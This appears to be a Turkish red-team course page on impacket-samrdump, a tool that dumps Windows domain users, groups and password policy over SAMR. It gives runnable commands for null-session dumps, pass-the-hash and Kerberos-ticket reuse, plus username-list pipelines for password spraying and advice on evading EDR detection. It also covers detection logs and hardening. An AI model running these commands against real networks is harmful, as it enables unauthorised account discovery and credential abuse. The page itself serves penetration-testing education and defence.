# impacket-samrdump

> **Kategori:** [1. TEMEL İSTEMCİLER VE AĞ PROTOKOL ARAÇLARI (NATIVE CLIENTS & UTILITIES)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** SAMR protokolü üzerinden kullanıcı ve grup listelerini uzaktan çekme.

---

## 1. Genel Bakış ve Amaç

`impacket-samrdump` (veya Impacket kütüphanesindeki adıyla `samrdump.py`), Microsoft Windows işletim sistemlerinde kullanıcı ve grup hesaplarını yöneten **MS-SAMR (Security Account Manager Remote Protocol)** arayüzü ile konuşarak hedef sistemdeki tüm kullanıcıları, güvenlik gruplarını, grup üyeliklerini ve parola politikasını otomatik olarak çeken bir Python aracıdır.

Samba'nın [rpcclient](./rpcclient.md) aracında operatörün tek tek elle komut girmesi (`enumdomusers`, `enumdomgroups`, `getdompwinfo`) gerekirken, `impacket-samrdump` bu süreci baştan sona otomatikleştirir. Tek bir satır komutla SMB üzerinden `\pipe\samr` boru hattına bağlanır ve saniyeler içinde hedef Etki Alanı Denetleyicisi (DC) veya üye sunucunun eksiksiz kimlik haritasını yapılandırılmış bir döküm (dump) olarak sunar.

### Mimari ve Protokol Akışı

```
┌───────────────────┐               TCP 445 (SMB)                  ┌───────────────────┐
│ impacket-samrdump │ ───────────────────────────────────────────► │   Hedef Windows   │
│      (Linux)      │        1. SMB Session Setup (Auth/Null)      │    (DC / Server)  │
│                   │ ◄─────────────────────────────────────────── │                   │
│                   │        2. Tree Connect to IPC$ Share         │                   │
│                   │ ───────────────────────────────────────────► │                   │
│                   │        3. Open Named Pipe: \pipe\samr        │                   │
│                   │ ───────────────────────────────────────────► │                   │
│                   │        4. SamrConnect5 & SamrOpenDomain      │                   │
│                   │ ───────────────────────────────────────────► │                   │
│                   │        5. SamrEnumerateUsersInDomain         │                   │
│                   │ ───────────────────────────────────────────► │                   │
│                   │ ◄─────────────────────────────────────────── │                   │
│                   │        6. SamrGetDisplayEnumerationIndex     │                   │
│                   │ ◄─────────────────────────────────────────── │                   │
└───────────────────┘                                              └───────────────────┘
      │
      ▼ Otomatik Toplanan Kritik Bilgiler:
      ├── Etki Alanı Adı ve Domain SID (S-1-5-21-...)
      ├── Kullanıcı Envanteri (Kullanıcı Adı + Hex/Dec RID + Açıklama)
      ├── Güvenlik Grupları (Domain Admins, Enterprise Admins, DnsAdmins vb.)
      ├── Grup Üyelikleri (Hangi kullanıcı hangi idari grupta)
      └── Parola Politikası (Min uzunluk, parola geçmişi, kilitlenme eşiği)
```

1. **SMB ve Boru Bağlantısı:** İstemci, TCP 445 üzerinden hedef makineye bağlanır, `IPC$` paylaşımına geçer ve `\pipe\samr` (UUID: `12345778-1234-abcd-ef00-0123456789ac` v1.0) adlandırılmış boru hattına RPC Bind işlemi yapar.
2. **SAMR Oturumu Başlatma:** `SamrConnect5` çağrısı ile SAM veritabanı açılır, etki alanı adı çözümlenir (`SamrLookupDomainInScope`) ve etki alanı nesnesi tanıtıcısı (`SamrOpenDomain`) alınır.
3. **Kullanıcı ve Grup Dökümü:** `SamrEnumerateUsersInDomain` ve `SamrEnumerateGroupsInDomain` fonksiyonlarıyla tüm nesneler RID değerleriyle birlikte belleğe alınır.
4. **Grup Üyeliği Çözümleme:** Her grup için `SamrOpenGroup` ve `SamrGetMembersInGroup` çağrılarak üyelerin RID listesi çözülür.
5. **Politika Çözümleme:** `SamrQueryInformationDomain` çağrısı (Bilgi Sınıfı 1 ve 3) ile parola kuralları listelenir.

### Neden Önemli?

| Senaryo | Operasyonel Katkı |
|---|---|
| **Otomatik Kullanıcı Listesi Çıkarma** | Parola püskürtme (Password Spraying) araçlarına girdi oluşturacak temiz kullanıcı listesini tek komutla üretir. |
| **Parola Kilitleme Eşiği Tespiti** | Püskürtme yaparken hesapları kilitlememek için `account_lockout_threshold` değerini anında raporlar. |
| **Pass-the-Hash Desteği** | Düz parola yerine NTLM hash (`-hashes`) kullanarak üst yetkili kullanıcılardan veri çeker. |
| **Grup Hiyerarşisi Analizi** | Kritik yönetici gruplarının (Domain Admins vb.) üyelerini tek bakışta gösterir. |
| **Kullanıcı Açıklamalarında Parola Avı** | Kullanıcı açıklamaları (`desc = ...`) dökümde listelendiği için sistem yöneticilerinin bıraktığı geçici parolaları yakalar. |

### Karşılaştırma: samrdump vs Alternatif Keşif Yöntemleri

| Özellik | impacket-samrdump | rpcclient | enum4linux-ng | ldapsearch | BloodHound |
|---|---|---|---|---|---|
| **Kullanım Kolaylığı** | Otomatik tek komut | Manuel interaktif | Otomatik modüler | Manuel filtreleme | Ajan / Collector |
| **Protokol** | MS-RPC over SMB | MS-RPC over SMB | SMB, RPC, NetBIOS, LDAP | LDAP (TCP 389/636) | LDAP + SMB |
| **Gürültü Seviyesi** | Orta | Düşük-Orta | Yüksek | Çok Düşük (Sessiz) | Düşük-Orta |
| **MDI / EDR Tespiti** | Yüksek (SAMR Alarmı) | Yüksek (SAMR Alarmı) | Yüksek | Düşük | Düşük |
| **RestrictRemoteSAM Etkisi**| Kısıtlamaya takılır | Kısıtlamaya takılır | Kısmen takılır | Etkilenmez | Etkilenmez |
| **Parola Politikası** | ✅ Tam Döküm | ✅ `getdompwinfo` | ✅ Tam Döküm | ✅ Dizin öznitelikleri | ✅ Domain Node |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel CLI Sözdizimi

```bash
# Standart kimlik bilgisi ile çalıştırma:
impacket-samrdump [domain/]username[:password]@<hedef_IP_veya_Host>

# Python betiği doğrudan çağrısı:
samrdump.py [domain/]username[:password]@<hedef_IP_veya_Host>
```

### Bağlantı ve Kimlik Doğrulama Parametreleri

| Parametre | Açıklama | Örnek |
|---|---|---|
| `domain/user:pass@target` | Standart bağlantı ve kimlik formatı | `CORP/j.doe:P@ss123@192.168.1.10` |
| `-hashes` | Pass-the-Hash için NTLM hash (`[LM:]NT`) | `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` |
| `-no-pass` | Parola sorma istemini kapatır (Null session için) | `-no-pass` |
| `-k` | Kerberos kimlik doğrulaması kullan (`KRB5CCNAME`) | `-k -no-pass` |
| `-aesKey` | Kerberos kimlik doğrulamasında kullanılacak AES anahtarı | `-aesKey 7b318d9f...` |
| `-port` | SMB bağlantı portu (139 veya 445, varsayılan: 445) | `-port 445` |
| `-target-ip` | Kerberos FQDN kullanılırken hedef IP belirtme | `-target-ip 192.168.1.10` |
| `-csv` | Sonuçları CSV benzeri virgülle ayrılmış formatta basar | `-csv` |
| `-ts` | Çıktı log satırlarına zaman damgası ekler | `-ts` |
| `-debug` | Ayrıntılı soket ve protokol hata ayıklama çıktılarını gösterir | `-debug` |

---

## 3. Pratik Komut Örnekleri

### 3.1 Anonim (Null Session) ile SAM Veritabanı Dökümü
Eski veya sertleştirilmemiş Windows ortamlarında kimliksiz ilk döküm:

```bash
impacket-samrdump ''@192.168.1.10 -no-pass
```

**Gerçekçi Çıktı Analizi:**
```text
[*] Retrieving endpoint list from 192.168.1.10
[*] Connecting to ncacn_np:192.168.1.10[\pipe\samr]
[*] Domain Name: CORP
[*] Domain Sid: S-1-5-21-3829182391-238491823-1029384918
[*] Found user: Administrator, desc = Built-in account for administering the computer/domain
[*] Found user: Guest, desc = Built-in account for guest access to the computer/domain
[*] Found user: krbtgt, desc = Key Distribution Center Service Account
[*] Found user: j.doe, desc = Helpdesk - Gecici Parola: Welcome2026!
[*] Found user: svc_sql, desc = Service account for MSSQL cluster
[*] Found group: Domain Admins
[*]   Group members: Administrator
[*] Found group: Enterprise Admins
[*]   Group members: Administrator
[*] Found group: IT_Support
[*]   Group members: j.doe
[*] Password Policy:
[*]   Minimum password length: 8
[*]   Password history length: 24
[*]   Account lockout threshold: 5
[*]   Lockout observation window: 30 minutes
[*]   Account lockout duration: 30 minutes
```
- **Kritik Bulgular:**
  1. `Domain Sid` ele geçirildi → Golden Ticket / Silver Ticket üretimi için kullanılabilir.
  2. `j.doe` kullanıcısının açıklama (`desc`) alanında açık metin parola unutulmuş (`Welcome2026!`).
  3. `Account lockout threshold: 5` → Parola püskürtme yapılırken 4 denemeden sonra durulmalıdır.

### 3.2 Etki Alanı Kullanıcısı ile Yetkili Döküm
Standart bir etki alanı kullanıcısıyla tüm nesneleri çekme:

```bash
impacket-samrdump CORP/j.doe:'Password123!'@192.168.1.10
```

### 3.3 Pass-the-Hash (NTLM Hash) ile Döküm Alma
Düz parola bilinmediğinde, bellekten veya SAM dökümünden elde edilen hash ile oturum açma:

```bash
impacket-samrdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/Administrator@192.168.1.10
```

### 3.4 Çıktıdan Yalnızca Kullanıcı Adlarını Ayıklama (Wordlist Hazırlığı)
Döküm çıktısını `awk` ve `grep` ile filtreleyerek parola püskürtme araçları için temiz kullanıcı listesi oluşturma:

```bash
impacket-samrdump CORP/j.doe:'Password123!'@192.168.1.10 | grep "Found user:" | awk '{print $3}' | tr -d ',' > /opt/recon/users.txt
```

### 3.5 Kerberos Bileti (ccache) ile Parolasız Döküm
NTLM trafiği üretmeden, ele geçirilen TGT/TGS bileti ile etki alanı denetleyicisini sorgulama:

```bash
export KRB5CCNAME=/tmp/administrator.ccache
impacket-samrdump -k -no-pass CORP/Administrator@dc01.corp.local
```

### 3.6 Parola Açıklamalarında Hassas Veri Avı
Kullanıcı açıklamalarında unutulan parolaları, API anahtarlarını veya iletişim bilgilerini grep ile çekme:

```bash
impacket-samrdump CORP/j.doe:'Password123!'@192.168.1.10 | grep -i -E "parola|password|pass|gecici|temp|key"
```

### 3.7 Python ile Özel SAMR Döküm Otomasyonu
Impacket'in SAMR modülünü doğrudan Python scriptinde kullanarak kullanıcıları ve kilitlenme politikasını çekme:

```python
#!/usr/bin/env python3
from impacket.dcerpc.v5 import transport, samr

target = "192.168.1.10"
username = "j.doe"
password = "Password123!"
domain = "CORP"

string_binding = f"ncacn_np:{target}[\\pipe\\samr]"
rpctransport = transport.DCERPCTransportFactory(string_binding)
rpctransport.set_credentials(username, password, domain)

try:
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)
    
    server_handle = samr.hSamrConnect(dce)['ServerHandle']
    domains = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)['Buffer']['Buffer']
    
    for d in domains:
        domain_name = d['Name']
        print(f"[+] Etki Alanı: {domain_name}")
        domain_sid = samr.hSamrLookupDomainInScope(dce, server_handle, domain_name)['DomainId']
        domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)['DomainHandle']
        
        # Parola Politikası Bilgisi:
        pw_info = samr.hSamrQueryInformationDomain(dce, domain_handle, samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)['Buffer']['Password']
        lockout_info = samr.hSamrQueryInformationDomain(dce, domain_handle, samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)['Buffer']['Lockout']
        print(f"    - Min Parola Uzunluğu: {pw_info['MinPasswordLength']}")
        print(f"    - Kilitleme Eşiği: {lockout_info['LockoutThreshold']}")
        
        # Kullanıcı Numaralandırma:
        users = samr.hSamrEnumerateUsersInDomain(dce, domain_handle)['Buffer']['Buffer']
        print(f"[+] Toplam {len(users)} kullanıcı bulundu:")
        for u in users:
            print(f"    - {u['Name']} (RID: {u['RelativeId']})")
            
    dce.disconnect()
except Exception as e:
    print(f"[-] Hata: {e}")
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Kök Neden | Kesin Operasyonel Çözüm |
|---|---|---|
| `STATUS_ACCESS_DENIED` | Windows 10/Server 2016+ üzerinde `RestrictRemoteSAM` devrede veya anonim erişim engelli. | Yalnızca yerel veya etki alanı yöneticisi haklarıyla SAMR sorgusu çalışabilir. Standart kullanıcıysanız sorgulamayı LDAP ([ldapsearch](./ldapsearch.md)) üzerinden yapın. |
| `STATUS_LOGON_FAILURE` | Kullanıcı adı veya parola hatalı / hesap kilitlenmiş veya devre dışı. | Parolayı ve kullanıcı adını teyit edin; hesap kilitlenme eşiğini aşmamak için denemeyi durdurun. |
| `Connection refused (port 445)` | Hedef sistemde SMB servisi kapalı veya güvenlik duvarı engelliyor. | Port erişimini `nmap -p 445 <IP>` ile sınayın. |
| `STATUS_PIPE_DISCONNECTED` | Hedef sistemdeki EDR/AV çözümü seri SAMR isteklerini algılayıp bağlantıyı kesti. | Sorgu hızını düşürün, proxy/pivot zincirini kontrol edin veya LDAP yöntemine geçin. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hedef IP olarak verildiği için Kerberos SPN çözülemedi. | Hedef parametresine IP yerine sunucunun tam FQDN adını (`dc01.corp.local`) verin. |
| `STATUS_OBJECT_NAME_NOT_FOUND` | Belirtilen etki alanı veya SAM veritabanı hedef sistemde mevcut değil. | Etki alanı adını (`CORP`) doğru girdiğinizden emin olun veya yerel SAM için `.` kullanın. |
| `SMB SessionError: STATUS_NETWORK_ACCESS_DENIED` | Hedef sistem IP tabanlı SMB erişimini veya null session'ı ağ düzeyinde engellemiş. | Kimlik bilgisi vererek bağlanın (`CORP/user:pass@target`). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler

| Kaynak | Event ID / Log | Detay ve İz Açıklaması |
|---|---|---|
| **Windows Security Log** | **4624** (Logon Type 3) | SMB üzerinden açılan ağ oturumu kaydı (Network Logon). |
| **Windows Security Log** | **4625** | Başarısız oturum açma veya reddedilen anonim oturum denemesi. |
| **Windows Security Log** | **5145** | `IPC$` paylaşımındaki `\pipe\samr` boru hattına erişim (`AccessMask: 0x12019f`). |
| **Sysmon** | **Event ID 3** | İstemci IP'sinden hedef TCP 445 portuna ağ bağlantısı. |
| **Sysmon** | **Event ID 18** | Pipe Connected — `\samr` borusuna istemci bağlandığında loglanır. |

### 5.2 Ağ ve EDR İmzaları
- **MDI / ATA "Active Directory Reconnaissance via SAMR":** Microsoft Defender for Identity (MDI) ve modern SIEM korelasyonları, tek bir kaynak IP'den gelen ardışık `SamrEnumerateUsersInDomain` ve `SamrEnumerateGroupsInDomain` çağrılarını otomatik olarak **"SAMR Üzerinden Keşif"** tehdidi olarak işaretler.
- **Impacket Python İmzası:** Impacket kütüphanesinin SMB paket yapısındaki sabit bayraklar (Client GUID ve dialect dizgileri) NDR sistemlerince tespit edilebilir.
- **RestrictRemoteSAM Savunması (MS16-076 / CVE-2016-0128):**
  - Registry: `HKLM\System\CurrentControlSet\Control\Lsa\RestrictRemoteSAM`
  - Varsayılan SDDL: `O:BAG:BAD:(A;;RC;;;BA)` → Yalnızca Built-in Administrators (Yerel ve Domain Admin) uzaktan SAMR sorgulayabilir. Standart etki alanı kullanıcıları `STATUS_ACCESS_DENIED` alır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | impacket-samrdump Kullanımı |
|---|---|---|
| **T1087.002** | Account Discovery: Domain Account | SAMR üzerinden etki alanı kullanıcı hesaplarının listelenmesi |
| **T1087.001** | Account Discovery: Local Account | Yerel makine SAM kullanıcılarının listelenmesi |
| **T1069.002** | Permission Groups Discovery: Domain Groups | Güvenlik grupları ve grup üyelerinin dökülmesi |
| **T1201** | Password Policy Discovery | Parola politikası, kilitleme eşiği ve geçmiş kurallarının tespiti |
| **T1550.002** | Pass the Hash | `-hashes` ile hash tabanlı oturum açma |

### 5.4 OPSEC Önerileri

| Risk | Operasyonel Önlem |
|---|---|
| **SAMR sorguları EDR/MDI tarafından çok sıkı izlenir** | SAMR yerine LDAP protokolünü ([ldapsearch](./ldapsearch.md)) tercih edin; LDAP kurumsal ağlarda olağan trafik olarak değerlendirilir. |
| **Toplu döküm yüksek log üretir** | Tüm kullanıcıları tek hamlede SAMR ile çekmek yerine, BloodHound veya LDAP filtreleri ile hedefli çalışın. |
| **PTH kullanımı 4672 üretir** | Admin hash ile bağlanıldığında üretilen `Special Privileges Assigned` olayını göz önünde bulundurun. |
| **Parola kilitlenme riski** | `account_lockout_threshold` değerini kontrol etmeden asla parola denemesi yapmayın. |

### 5.5 Savunma Karşılığı (Blue Team Linkleri)
- Log analizi ve tespit senaryoları → [Blue M01 — Görünürlük ve Log Yönetimi](../../../2-Blue_Team/Modul_01_Gorunurluk_ve_Log_Yonetimi/)
- Uzaktan SAMR erişimini kısıtlama → GPO: `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options -> Network access: Restrict clients allowed to make remote calls to SAM`
- Parola sertleştirme ve hesap koruma → [Blue M03 — Kimlik Bilgisi Koruması](../../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/)

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

Aşağıdaki liste, sızma testlerinde ve operasyonel keşiflerde en sık başvurulan `impacket-samrdump` komutlarını, kullanım amaçlarını ve parametre analizlerini bir araya getirir:

### 6.1 Anonim (Null Session) ile Hızlı Kullanıcı ve Politika Dökümü
```bash
impacket-samrdump ''@192.168.1.10 -no-pass
```
- **Ne Yapar?** Kimlik doğrulaması olmadan hedef makinenin SAM veritabanına bağlanır; kullanıcıları, grupları ve parola politikasını otomatik ekrana basar.
- **Ne Zaman Kullanılır?** İlk temas anında sunucunun dışarı sızdırdığı kimlik bilgilerini ve kilitlenme kurallarını saniyeler içinde almak için.
- **Parametreler:** `''@hedef` (Boş kullanıcı adı), `-no-pass` (Parola sormayı kapatır).

### 6.2 Etki Alanı Kullanıcı Kimliği ile Tam Döküm Alma
```bash
impacket-samrdump CORP/j.doe:'Password123!'@192.168.1.10
```
- **Ne Yapar?** Meşru bir etki alanı kullanıcısının yetkileriyle SMB oturumu açarak etki alanındaki tüm kullanıcı ve grup haritasını döker.
- **Ne Zaman Kullanılır?** Standart bir hesap ele geçirildiğinde etki alanının tüm kullanıcı ve grup listesini hızlıca arşivlemek için.
- **Parametreler:** `DOMAIN/kullanıcı:parola@hedef` formatında kimlik iletimi sağlar.

### 6.3 Pass-the-Hash (NTLM Hash) ile Yönetici Bağlamında Döküm
```bash
impacket-samrdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/Administrator@192.168.1.10
```
- **Ne Yapar?** Düz parola olmadan yalnızca NT hash'i kullanarak en üst yetki seviyesinde SAMR arayüzünü sorgular.
- **Ne Zaman Kullanılır?** LSASS bellek dökümünden veya SAM dosyasından hash elde edildiğinde kırmaya çalışmadan doğrudan yetkili keşif yapmak için.
- **Parametreler:** `-hashes` (`:NTHASH` formatında NTLM hash).

### 6.4 Parola Püskürtme İçin Temiz Kullanıcı Listesi Çıkarma (Tek Satır Pipeline)
```bash
impacket-samrdump CORP/j.doe:'Password123!'@192.168.1.10 | grep "Found user:" | awk '{print $3}' | tr -d ',' > /tmp/users.txt
```
- **Ne Yapar?** Döküm çıktısını otomatik filtreleyerek sadece kullanıcı adlarını içeren temiz bir metin dosyası (`users.txt`) üretir.
- **Ne Zaman Kullanılır?** Kerbrute, NetExec veya SprayingToolkit araçlarına girdi hazırlamak için.

### 6.5 Sadece Parola Kilitleme Eşiğini (Lockout Threshold) Yakalama
```bash
impacket-samrdump CORP/j.doe:'Password123!'@192.168.1.10 | grep -i -E "lockout|minimum"
```
- **Ne Yapar?** Dökümün sonundaki parola politikası bölümünü filtreleyerek kilitleme eşiği ve süresini ekrana basar.
- **Ne Zaman Kullanılır?** Hesapların kilitlenmesini kesin olarak önlemek amacıyla izin verilen maksimum yanlış parola deneme sayısını görmek için.

### 6.6 Kullanıcı Açıklamalarında Unutulmuş Parolaları Avlama
```bash
impacket-samrdump CORP/j.doe:'Password123!'@192.168.1.10 | grep -i -E "desc = .*(pass|parola|gecici|welcome|123)"
```
- **Ne Yapar?** Kullanıcı hesaplarının açıklama (description) alanlarını regex ile tarayarak açık metin parola sızıntılarını yakalar.
- **Ne Zaman Kullanılır?** Sistem yöneticilerinin kullanıcı oluştururken açıklama alanına yazdığı geçici parolaları keşfetmek için.

### 6.7 Kerberos Bileti (ccache) ile Parolasız ve OPSEC Uyumlu Döküm
```bash
export KRB5CCNAME=/tmp/admin.ccache
impacket-samrdump -k -no-pass CORP/Administrator@dc01.corp.local
```
- **Ne Yapar?** NTLM yerine ccache Kerberos biletini kullanarak FQDN üzerinden hedef Etki Alanı Denetleyicisini sorgular.
- **Ne Zaman Kullanılır?** NTLM trafiğinin tespit kurallarını tetiklediği sıkı izlenen kurumsal ortamlarda.
- **Parametreler:** `-k` (Kerberos kullanımı zorlar), `-no-pass` (Parola sormaz).

### 6.8 Alternatif SMB Portu (TCP 139) Üzerinden Döküm
```bash
impacket-samrdump -port 139 CORP/j.doe:'Password123!'@192.168.1.10
```
- **Ne Yapar?** TCP 445 engellendiğinde bağlantıyı NetBIOS Session Service (TCP 139) portu üzerinden gerçekleştirir.
- **Ne Zaman Kullanılır?** Eski Windows sürümlerinde veya 445 portunun güvenlik duvarı tarafından filtrelendiği senaryolarda.
- **Parametreler:** `-port 139` (Port seçimi).

### 6.9 Yerel Makine SAM Veritabanı Dökümü (Local SAM Dump)
```bash
impacket-samrdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 ./Administrator@192.168.1.10
```
- **Ne Yapar?** Etki alanı yerine hedef makinenin yerel SAM veritabanındaki kullanıcı ve grupları döker.
- **Ne Zaman Kullanılır?** Üye sunucunun yerel yönetici parolası veya LAPS parolası ele geçirildiğinde yerel kullanıcıları analiz etmek için.
- **Parametreler:** `./kullanıcı` veya `localhost/kullanıcı` (Yerel yetkilendirme).

### 6.10 Çıktıyı CSV Benzeri Yapılandırılmış Kaydetme
```bash
impacket-samrdump -csv CORP/j.doe:'Password123!'@192.168.1.10 > /tmp/samrdump.csv
```
- **Ne Yapar?** Dökümü virgülle ayrılmış formatta dosyaya yazar.
- **Ne Zaman Kullanılır?** Excel, LibreOffice Calc veya otomatik scriptlerle kullanıcı/grup matrisini analiz etmek için.
- **Parametreler:** `-csv` (CSV formatı çıktısı).

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Impacket samrdump.py Kaynak Kodu | [github.com/fortra/impacket](https://github.com/fortra/impacket/blob/main/examples/samrdump.py) |
| MS-SAMR Protokol Spesifikasyonu | [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/) |
| MITRE ATT&CK T1087.002 | [attack.mitre.org](https://attack.mitre.org/techniques/T1087/002/) |
| MITRE ATT&CK T1201 | [attack.mitre.org](https://attack.mitre.org/techniques/T1201/) |
| RestrictRemoteSAM Güvenlik Sertleştirmesi | [Microsoft Docs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-restrict-clients-allowed-to-make-remote-sam-calls) |

---

> **Önceki:** [← impacket-rpcdump](./impacket-rpcdump.md) · **Sonraki:** [enum4linux-ng →](./enum4linux-ng.md)
